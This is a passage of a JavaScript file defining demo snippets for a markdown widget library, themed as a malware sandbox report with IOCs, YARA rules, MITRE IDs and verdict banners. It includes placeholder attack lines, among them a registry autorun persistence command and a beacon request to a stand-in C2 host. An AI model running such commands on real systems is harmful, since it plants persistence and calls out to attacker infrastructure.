      ['detonation', `:::dtimeline\n00:00 | detonation\n00:03 | unpacks UPX payload\n00:41 | dns query evil-c2.example\n:::`],
      ['investigation', `:::dtimeline\nDay 1 | first seen\nDay 2 | sandbox run\nDay 3 | signature published\n:::`],
      ['releases', `:::dtimeline\nv0.1.0 | first release\nv0.1.1 | composer added\nv0.2.0 | detailed examples\n:::`],
    ),
  },
  {
    section: 'Data', title: 'swatches', note: '3 variants: theme palette, severity, grayscale.',
    source: V(
      ['palette', `:::swatches\n#ff2e63 danger, #36f9f6 accent, #39ff14 ok, #ffd400 warn\n:::`],
      ['severity', `:::swatches\n#b00020 critical, #b58900 high, #1a7f37 low\n:::`],
      ['grayscale', `:::swatches\n#111 ink, #555 mid, #999 muted, #ddd paper\n:::`],
    ),
  },

  // ============ Presentation ============
  {
    section: 'Presentation', title: 'banner', note: '3 variants: report title, verdict, case status.',
    source: V(
      ['report title', `:::banner Threat Report — sample.exe | Windows 10 sandbox · 120s\n:::`],
      ['verdict', `:::banner Verdict: MALICIOUS | RedLine stealer · score 92/100\n:::`],
      ['case status', `:::banner Case #4821 — In review | analyst: Kagan · priority: high\n:::`],
    ),
  },
  {
    section: 'Presentation', title: 'note', note: '3 variants: analyst note, reminder, tip.',
    source: V(
      ['analyst note', `:::note analyst note\nSample sleeps ~40s before beaconing. Watch for **DNS** exfil.\n:::`],
      ['reminder', `:::note reminder\nRe-run in the LR sandbox before closing the ticket.\n:::`],
      ['tip', `:::note tip\nAdd \`iso\` to any graph for a 2.5D view.\n:::`],
    ),
  },
  {
    section: 'Presentation', title: 'quote', note: '3 variants: with author, without, motto.',
    source: V(
      ['with author', `:::quote\nThe sample is a textbook stealer. — Threat Intel Team\n:::`],
      ['without author', `:::quote\nBlock the C2 and rotate credentials immediately.\n:::`],
      ['motto', `:::quote\nAssume breach. Verify everything.\n:::`],
    ),
  },

  // ============ Malware ============
  {
    section: 'Malware', title: 'ioc', note: '3 variants: mixed indicators, hashes, network.',
    source: V(
      ['mixed indicators', `:::ioc\nsha256  9f86d081884c7d659a2feaa0c55ad015 | dropper\nip  45.13.7.2:443 | c2\ndomain  evil-c2.example\nmutex  Global\\qz9x\n:::`],
      ['hashes', `:::ioc\nsha256  9f86d081884c7d659a2feaa0c55ad015\nmd5  5d41402abc4b2a76b9719d911017c592\nsha1  aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d\n:::`],
      ['network', `:::ioc\nip  45.13.7.2:443 | c2\ndomain  evil-c2.example | fallback\nurl  http://evil-c2.example/gate.php\n:::`],
    ),
  },
  {
    section: 'Malware', title: 'verdict', note: '3 variants: malicious, suspicious, clean.',
    source: V(
      ['malicious', `:::verdict\nmalicious score 92/100 · RedLine\n:::`],
      ['suspicious', `:::verdict\nsuspicious score 58/100 · needs review\n:::`],
      ['clean', `:::verdict\nclean score 4/100 · no signatures\n:::`],
    ),
  },
  {
    section: 'Malware', title: 'mitre', note: '3 variants: techniques, sub-techniques, persistence.',
    source: V(
      ['techniques', `:::mitre\nT1055 Process Injection, T1071 C2, T1027 Obfuscation\n:::`],
      ['sub-techniques', `:::mitre\nT1547.001 Registry Run Keys, T1059.001 PowerShell, T1071.004 DNS\n:::`],
      ['persistence', `:::mitre\nT1547 Boot Autostart, T1053 Scheduled Task, T1543 System Service\n:::`],
    ),
  },
  {
    section: 'Malware', title: 'hexdump', note: '3 variants: PE header, ascii string, config blob.',
    source: V(
      ['PE header', `:::hexdump\nMZ..dropper.exe payload begins here with bytes\n:::`],
      ['ascii string', `:::hexdump\nGET /gate.php?id=001 HTTP/1.1 Host: evil-c2.example\n:::`],
      ['config blob', `:::hexdump\nkey=9f86 c2=45.13.7.2 sleep=45 jitter=10\n:::`],
    ),
  },
  {
    section: 'Malware', title: 'yara', note: '2 variants: simple, with meta.',
    source: V(
      ['simple', `:::yara\nrule RedLine {\n  strings:\n    $a = "evil-c2.example"\n  condition:\n    any of them\n}\n:::`],
      ['with meta', `:::yara\nrule RedLine_Stealer {\n  meta:\n    author = "analyst"\n  strings:\n    $a = "evil-c2.example"\n  condition:\n    any of them and filesize < 2MB\n}\n:::`],
    ),
  },
  {
    section: 'Malware', title: 'compare', note: '3 variants: code, config, variants.',
    source: V(
      ['code', `:::compare\n== Before\nplain http.get(host)\n== After\nhttps.post(host, encrypt())\n:::`],
      ['config', `:::compare\n== Clean\nproxy = none\n== Infected\nproxy = 45.13.7.2:8080\n:::`],
      ['variants', `:::compare\n== v1\nsleep 30s · plain http\n== v2\nsleep 45s · tls + jitter\n:::`],
    ),
  },
  {
    section: 'Malware', title: 'alert', note: '3 variants: danger, warn, success.',
    source: V(
      ['danger', `:::alert danger Beacon to 45.13.7.2 detected on host-7\n:::`],
      ['warn', `:::alert warn Unusual DNS volume from host-7\n:::`],
      ['success', `:::alert success Static scan clean across 14 engines\n:::`],
    ),
  },

  // ============ Widgets ============
  {
    section: 'Widgets', title: 'terminal', note: '3 variants: detonation, install, powershell.',
    source: V(
      ['detonation', `:::terminal detonation\n$ ./sample.exe\ndropping payload to %TEMP%\n$ reg add Run /v updater\nThe operation completed successfully.\n:::`],
      ['install', `:::terminal install\n$ npm i vizengine\nadded 1 package\n$ npm run build\ndone\n:::`],
      ['powershell', `:::terminal powershell\nPS> Get-Process | ? { $_.CPU -gt 90 }\nmalware.exe   98.4\n:::`],
    ),
  },
  {
    section: 'Widgets', title: 'kbd', note: '3 variants: shortcut, single key, navigation.',
    source: V(
      ['shortcut', `Open with :::kbd Ctrl + Shift + P :::`],
      ['single key', `Confirm with :::kbd Enter :::`],
      ['navigation', `Move with :::kbd ↑ :::  /  :::kbd ↓ :::  and select :::kbd Space :::`],
    ),
  },
  {
    section: 'Widgets', title: 'spinner (animated)', note: '2 variants: rotating arc with a status label.',
    source: V(
      ['scanning', `:::spinner scanning 2,481 files…\n:::`],
      ['connecting', `:::spinner connecting to sandbox…\n:::`],
    ),
  },
  {
    section: 'Widgets', title: 'loader (animated)', note: '2 variants: indeterminate sliding bar.',
    source: V(
      ['detonating', `:::loader detonating sample in sandbox\n:::`],
      ['uploading', `:::loader uploading sample to cluster\n:::`],
    ),
  },
  {
    section: 'Widgets', title: 'pulsedot (animated)', note: '2 variants: heartbeat indicator.',
    source: V(
      ['live host', `:::pulsedot host-7 · live\n:::`],
      ['recording', `:::pulsedot capture · recording\n:::`],
    ),
  },
  {
    section: 'Widgets', title: 'typewriter (animated)', note: '2 variants: types then blinks caret.',
    source: V(
      ['detection', `:::typewriter analyzing 45.13.7.2 → RedLine detected\n:::`],
      ['verdict', `:::typewriter verdict: malicious · score 92/100\n:::`],
    ),
  },
  {
    section: 'Widgets', title: 'beacon (animated)', note: '2 variants: expanding ping rings.',
    source: V(
      ['c2 ping', `:::beacon C2 ping every 45s\n:::`],
      ['heartbeat', `:::beacon agent heartbeat · 30s\n:::`],
    ),
  },
  {
    section: 'Widgets', title: 'radar (animated)', note: '2 variants: conic sweep with blips.',
    source: V(
      ['sweep', `:::radar\n:::`],
      ['labeled', `:::radar threat sweep\n:::`],
    ),
  },
  {
    section: 'Widgets', title: 'countdown (animated)', note: '2 variants: depleting timer ring.',
    source: V(
      ['sandbox TTL', `:::countdown 7s\nsandbox TTL\n:::`],
      ['lockout', `:::countdown 5s\nauto-quarantine\n:::`],
    ),
  },
  {
    section: 'Widgets', title: 'matrix (animated)', note: '2 variants: falling glyph rain.',
    source: V(
      ['default', `:::matrix\n:::`],
      ['labeled', `:::matrix decrypting…\n:::`],
    ),
  },
];

// late-bound figure source
window.VIZ_EXAMPLES.find((e) => e.title === 'figure / GIF').source =
  `![Sandbox execution capture](${window.VIZ_GIF})

The capture above is an animated GIF data-URI.`;
